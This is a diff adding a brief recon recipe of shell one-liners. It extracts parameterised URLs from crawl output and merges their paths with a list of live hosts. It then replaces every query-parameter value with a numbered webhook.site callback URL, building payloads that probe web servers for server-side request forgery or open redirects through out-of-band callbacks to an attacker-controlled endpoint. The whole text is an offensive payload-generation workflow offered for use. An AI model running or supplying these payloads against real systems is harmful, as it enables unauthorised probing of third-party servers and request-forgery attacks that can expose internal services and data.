@@ -1,0 +1,8 @@
+1. first replace them with slash and grep endpoint
+cat justturls.txt|grep =|egrep -iv '\.js|\.css'|qsreplace /|anew|sed -E 's/%2F/\//g'|sed -E 's#https?://[^/]+##; s#/\?#?#'|anew|grep -iv '\/\/'|python3 -c "import sys, urllib.parse; [print(urllib.parse.unquote(line.strip())) for line in sys.stdin]"|anew path.txt 
+
+2. merge the slash value endpoint with domain
+ awk 'NR==FNR{subdomains[++i]=$0; next} {for (j=1; j<=i; j++) print subdomains[j] $0}' ../httpx.txt path.txt|anew merge.txt
+
+3. now webhook url as value
+cat merge.txt|awk 'BEGIN{c=1} {split($0,a,"\\?"); domain=a[1]; if(length(a)>1){split(a[2],p,"&"); for(i in p){sub(/=.*/,"=https://webhook.site/value/emon" c,p[i]); c++;} out=domain"?"p[1]; for(i=2;i<=length(p);i++) out=out"&"p[i]; print out} else print domain}' | grep -i webhook.site|anew webhook.txt
